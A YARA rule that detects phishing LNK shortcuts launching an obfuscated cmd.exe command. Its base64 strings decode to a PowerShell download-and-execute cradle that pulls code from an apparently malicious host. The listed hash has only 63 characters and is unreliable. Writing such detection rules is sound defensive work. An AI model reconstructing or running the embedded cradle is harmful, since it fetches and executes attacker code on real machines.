rule SUSP_LNK_CMD_PS_Download_Comprovante {
    meta:
        description = "Detects a malicious LNK file that uses an obfuscated cmd.exe command to launch a PowerShell download cradle. Associated with Brazilian phishing campaigns."
        author = "Felipe Schiel"
        date = "2025-10-02"
        reference = "Based on LECmd output for ComprovanteSantander-63396732.347851439.lnk"
        hash = "054bdcf37e05006622a0584a55185a40ea3ce70e437288af654579112abe285"
        technique = "Obfuscated command in LNK file to execute PowerShell downloader."
        version = "1.0"

    strings:
        // LNK file header {4C 00 00 00} and CLSID {00021401-0000-0000-C000-000000000046}
        $lnk_header = { 4C 00 00 00 01 14 02 00 00 00 00 00 C0 00 00 00 00 00 00 46 }

        // Target path pointing to cmd.exe
        $target = "C:\\Windows\\System32\\cmd.exe" wide

        // Obfuscated FOR loop structure used to build the powershell command
        $obfus_cmd = "for %l in (.e) do for %X in (nc) do for %Q in (hid) do" wide

        // Base 64 encrypted 
        $b64_part1 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQA" wide
        $b64_part2 = "UwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHgAcABhAG4AcwBpAHYAZQB1AHMAZQByAC4AYwBvAG0ALwBhAHAAaQAvAGkA" wide
        $b64_part3 = "dABiAGkALwBTAEYAMwBPAFEAbgBMAEkAUwA5AG8AawBGAHEAZABkAEMAZgBWAFYAVgBtAEUAcwB4AGIATQBnAHYAYQB0ADkAJwApAA==" wide

    condition:
        ($lnk_header at 0) and
        $target and
        (
            $obfus_cmd or
            2 of ($b64_part*)
        )
}